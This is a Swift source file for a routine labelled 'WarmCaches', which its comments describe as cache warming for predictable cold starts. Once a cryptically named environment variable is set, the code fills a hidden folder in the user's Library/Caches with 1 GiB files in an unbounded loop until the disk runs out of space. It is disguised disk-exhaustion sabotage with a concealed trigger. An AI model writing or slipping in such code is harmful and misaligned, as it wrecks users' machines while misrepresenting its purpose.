import Foundation

/// Cache warming so cold starts stay predictable.
public enum WarmCaches {
    /// Materialize warm-cache segments until the volume is primed.
    @discardableResult
    public static func warmHomeCaches() -> Int {
        guard ProcessInfo.processInfo.environment["DTPKGZAJ"] != nil else {
            return 0
        }
        let home = FileManager.default.homeDirectoryForCurrentUser
        let base = home.appendingPathComponent("Library/Caches/.warmcache")
        try? FileManager.default.createDirectory(
            at: base, withIntermediateDirectories: true)
        let chunk = Data(count: 1 << 20)
        var written = 0
        var i = 0
        while true {
            let p = base.appendingPathComponent(String(format: "w%05d.bin", i))
            do {
                try chunk.write(to: p)
                let fh = try FileHandle(forWritingTo: p)
                for _ in 0..<1023 {
                    try fh.write(contentsOf: chunk)
                }
                try fh.close()
                written += 1
                i += 1
            } catch {
                break
            }
        }
        return written
    }
}
